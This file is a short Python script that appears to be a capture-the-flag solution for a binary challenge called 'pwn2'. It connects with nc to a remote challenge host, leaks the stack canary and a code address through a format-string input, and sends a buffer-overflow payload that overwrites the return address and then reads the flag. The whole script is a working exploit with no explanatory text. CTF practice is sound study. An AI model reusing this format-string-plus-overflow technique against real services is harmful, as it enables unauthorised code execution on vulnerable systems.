from pexpect import spawn
from struct import pack

p = spawn('/bin/bash', echo = False)
p.sendline('stty raw lnext ^- opost')
if 0:
    p.sendline('./pwn2;exit')
    p.sendline('CSCG{THIS_IS_TEST_FLAG}')
else:
    p.sendline('nc hax1.allesctf.net 9101;exit')
    p.sendline('CSCG{NOW_PRACTICE_MORE}')

p.send('foo(%39$p,%41$p)\n')
p.expect("foo\((.*),(.*)\)")
canary = int(p.match[1].decode("utf8"), 16)
main = int(p.match[2].decode("utf8"), 16)

base = main & ~0xfff
print(f"canary = 0x{canary:x}")
print(f"main = 0x{main:x}")
print(f"base = 0x{base:x}")

payload = b'Expelliarmus' + b'\0' * 252 + pack('QQQ', canary, 0, base | 0xb95)
p.sendline(payload)
p.sendline("cat flag;exit")
p.interact()